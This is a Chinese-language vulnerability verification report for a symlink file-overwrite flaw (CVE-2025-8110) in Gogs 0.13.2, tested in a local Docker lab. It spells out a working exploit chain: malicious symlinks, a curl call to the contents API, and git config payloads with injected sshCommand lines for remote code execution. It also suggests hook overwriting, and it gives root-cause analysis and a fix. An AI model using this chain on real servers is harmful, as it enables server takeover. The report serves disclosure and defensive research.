# CVE-2025-8110 漏洞验证报告

> **执行时间**: 2025-12-18
> **验证环境**: Gogs 0.13.2 (Docker) / macOS
>
> 执行 setup-gogs-vulnerable.sh就可以自动化利用docker搭建环境

## 1. 验证目标

验证 Gogs 版本 0.13.2 是否存在 **CVE-2025-8110 (符号链接文件覆盖)** 漏洞。
如果漏洞存在，攻击者可以通过构造特殊的 Git 符号链接，利用 API 覆盖服务器上的任意文件（如 `.git/config`），从而实现远程代码执行。

## 2. 验证过程实录

### 2.1 环境准备

- **目标**: `http://localhost:3000` (Docker 容器 `gogs-vulnerable`)
- **攻击者**: 拥有 `admin` 权限及 API Token (`6cfef48df8...`)
- **测试仓库**: `attacker/test-repo`

### 2.2 漏洞利用步骤

#### 步骤一：创建恶意符号链接

攻击者在本地仓库中创建了两个符号链接，并推送至服务器：

1.  `malicious_link_abs` -> `/tmp/pwned_marker` (测试任意文件写入)
2.  `link_to_config` -> `/data/git/gogs-repositories/attacker/test-repo.git/config` (测试 RCE 前置条件)

```bash
ln -s /tmp/pwned_marker malicious_link_abs
ln -s /data/git/gogs-repositories/attacker/test-repo.git/config link_to_config
git add . && git commit -m "Add symlinks" && git push
```

#### 步骤二：触发文件覆盖

使用 Gogs 的 `PutContents` API 向符号链接写入数据。

**测试 A：覆盖任意文件**

请求向 `malicious_link_abs` 写入 Base64 编码的 `"PWNED"`。

```bash
curl -X PUT "http://localhost:3000/api/v1/repos/attacker/test-repo/contents/malicious_link_abs" \
  -H "Authorization: token ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{ "content": "UFdORUQ=", "message": "Overwrite test", "branch": "master" }'
```

**测试 B：注入恶意 Git 配置**

请求向 `link_to_config` 写入包含恶意 `sshCommand` 的配置内容。

```ini
[core]
    repositoryformatversion = 0
    filemode = true
    bare = true
    sshCommand = touch /tmp/pwned_rce_verified; /usr/bin/ssh
```

**测试 C：注入恶意 Git 配置**

**伪造远程仓库**：攻击者定义了一个名为 `origin` 的远程仓库，地址是 `git@github.com:fake/fake.git`。

**触发流程**：

1. 当 Gogs 服务器（或者管理员在服务器上）对这个仓库执行任何涉及网络的命令（比如系统自动更新仓库、或者运行 `git fetch`）时。
2. Git 看到需要连接 `git@github.com`。
3. Git 检查配置文件，发现设定了 `sshCommand`。
4. Git **执行** `whoami > /tmp/hacked`。
5. **结果**：命令在服务器上执行成功，`/tmp` 目录下会出现一个 `hacked` 文件，里面包含运行该服务的用户名（例如 `git` 或 `root`）。

```
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
    ignorecase = true
    precomposeunicode = true
    sshCommand = "whoami > /tmp/hacked"
[remote "origin"]
    url = git@github.com:fake/fake.git
    fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
    remote = origin
    merge = refs/heads/master
```



### 2.3 结果验证

通过 Docker 容器内部检查实际文件状态。

#### 验证 A：任意文件写入成功

```bash
$ docker exec gogs-vulnerable cat /tmp/pwned_marker
PWNED
```
✅ **结果**：文件 `/tmp/pwned_marker` 被成功创建并写入内容，证明 Gogs 跟随符号链接写入了仓库外的路径。

#### 验证 B：配置文件篡改成功 (RCE)

```bash
$ docker exec gogs-vulnerable cat /data/git/gogs-repositories/attacker/test-repo.git/config
...
[core]
    ...
    sshCommand = touch /tmp/pwned_rce_verified; /usr/bin/ssh
```
✅ **结果**：仓库的 Git 配置文件已被覆盖。

当系统或其他用户通过 SSH 拉取/推送该仓库时，将执行 `touch /tmp/pwned_rce_verified` 命令。

```
# 1. 确保在正确的目录

cd /data/git/gogs-repositories/admin1/exploit-test.git

# 2. 直接对一个任意 SSH URL 执行命令

# 这会强制 Git 使用配置文件里的 sshCommand 去连接这个地址

git ls-remote git@github.com:fake/fake.git

# 3. 检查 RCE 结果

ls -l /tmp/pwned_rce_verified
```



#### 验证 3：配置文件篡改成功 (RCE)

如果系统管理员登录到服务器，在这个受污染的仓库目录下执行了任何涉及网络的操作：

- ```
  git fetch
  ```

- ```
  git push
  ```

- ```
  git pull
  ```

- ```
  git ls-remote
  ```



如果无法配置镜像，攻击者可以覆盖 Gogs 的钩子文件 (Hooks)。即不覆盖 .git/config，而是覆盖 .git/hooks/post-receive。这样只要攻击者再往仓库 push 一次代码，服务器接收后就会立即运行这个脚本 —— 这是比覆盖 config 更稳定、更直接的 RCE 方式。

## 3. 漏洞成因


​	服务端在处理 API 文件写入请求时，缺少对符号链接的有效检查（如 `lstat`），导致攻击者可以绕过沙箱限制覆盖系统文件。

​	**漏洞成因 ** (Root Cause): 该漏洞是由于 Gogs 的 PutContents API (文件上传/编辑接口) 在写入文件时，缺乏对符号链接 (Symbolic Link) 的检查导致的。

​	**代码分析:**

​	入口点: internal/route/api/v1/repo/contents.go 中的 PutContents 函数。
​	它虽然使用了 pathutil.Clean 来清理路径以防止传统的目录遍历 (如 ../)，但并未检查文件类型。
​	触发点: PutContents 调用了 internal/db/repo_editor.go 中的 UpdateRepoFile 函数。
漏洞逻辑:gfe

```go
// internal/db/repo_editor.go

filePath := path.Join(localPath, opts.NewTreeName)

// ...

// 直接写入文件，如果 filePath 是一个符号链接，os.WriteFile 会跟随链接写入指向的目标

if err = os.WriteFile(filePath, []byte(opts.Content), 0600); err != nil { ... }
```

​	**缺失的检查**: 代码没有使用 os.Lstat 或类似机制来验证 filePath 是否是一个已经存在的符号链接。
​	**攻击利用**: 攻击者可以在仓库中提交一个指向敏感位置（例如 .git/config）的符号链接，然后通过 API 更新这个“文件”。由于缺乏检查，Gogs 不会覆盖符号链接本身，而是覆盖链接指向的敏感文件，从而实现配置篡改或远程代码执行 (RCE)。

## 4. 修复建议

建议 Gogs 开发者在 `PutContents` 接口实现中加入以下检查逻辑：

1.  解析目标路径。
2.  使用 `os.Lstat` 获取文件信息。
3.  如果 `fileInfo.Mode() & os.ModeSymlink != 0`，则**拒绝写入**并返回错误。

---
*本报告仅供安全研究与教育使用，请勿用于非法目的。*
